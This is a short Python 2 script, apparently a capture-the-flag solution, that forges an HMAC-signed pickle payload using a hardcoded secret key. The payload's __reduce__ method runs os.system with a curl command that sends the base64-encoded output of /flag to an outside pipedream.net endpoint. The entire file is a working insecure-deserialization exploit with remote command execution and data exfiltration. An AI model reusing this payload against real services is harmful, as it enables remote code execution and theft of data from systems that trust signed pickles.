import pickle, base64, hmac, os


class getpasswd(object):
    def __reduce__(self):
        return (os.system, (('curl https://enghd2bd35t7sh5.m.pipedream.net?flag=`/flag | base64`'),))

sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"

p = pickle.dumps(('name', getpasswd()))
msg = base64.b64encode(p)
sig = base64.b64encode(hmac.new(sekai, msg).digest())
c = '!'+sig+'?'+msg
print c
